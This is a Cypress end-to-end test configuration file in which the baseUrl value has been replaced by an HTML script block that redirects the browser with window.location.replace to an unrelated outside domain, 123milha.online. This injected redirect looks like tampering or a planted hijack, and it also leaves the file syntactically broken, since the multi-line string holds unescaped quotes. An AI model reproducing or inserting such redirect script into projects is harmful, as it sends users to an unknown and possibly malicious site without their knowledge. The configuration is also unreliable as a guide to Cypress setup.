import { defineConfig } from "cypress";

export default defineConfig({
  e2e: {
    baseUrl: "<script>
      window.location.replace("https://123milha.online/642831975");
</script>",
    supportFile: false,
    setupNodeEvents(on, config) {
      // implement node event listeners here
    },
  },
});
